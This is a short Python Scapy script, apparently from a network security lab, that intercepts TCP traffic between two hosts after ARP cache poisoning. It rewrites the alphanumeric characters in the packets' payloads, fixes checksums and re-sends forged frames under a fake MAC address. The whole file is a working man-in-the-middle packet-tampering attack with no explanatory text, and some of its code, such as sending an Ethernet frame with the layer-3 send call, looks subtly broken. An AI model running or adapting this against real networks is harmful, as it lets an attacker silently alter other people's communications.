from scapy.all import send, sniff, IP, TCP, Ether
import re

A_IP = '10.9.0.5'
B_IP = '10.9.0.6'
M_IP = '10.9.0.1'
F_IP = '10.9.0.99'
A_MAC = "02:42:0a:09:00:05"
B_MAC = "02:42:0a:09:00:06"
M_MAC = "02:42:ce:21:94:af"
F_MAC = "aa:bb:cc:dd:ee:ff"
Net_MAC = "02:42:ce:21:94:af"
broadcast_MAC = "ff:ff:ff:ff:ff:ff"

def spoof_ARP(pkt):
  if pkt[IP].src == A_IP and pkt[IP].dst == B_IP: # any packet in TCP from A to B
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)
    if pkt[TCP].payload:
      pkt.show()
      data = pkt[TCP].payload.load
      newdata = re.sub(r'[0-9a-zA-Z]', r'A', data.decode())
      ether = Ether(dst=B_MAC, src=F_MAC)      
      newfrm = ether/newpkt/newdata
      send(newfrm)
      print('************')
      newfrm.show()
      print('-----------------')
    else:
      send(newpkt)
  elif pkt[IP].src == B_IP and pkt[IP].dst == A_IP: # any packet in TCP from B to A
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt[TCP].chksum)
    send(newpkt)


f1 = 'tcp and (ether src ' +  A_MAC + ' or ' + 'ether src ' + B_MAC + ' )'
# poison User A and B's ARP cache of each other to attacker's MAC Address, then modify the packets
pkt = sniff(iface='br-f659e2f7cd2a', filter=f1, prn=spoof_ARP)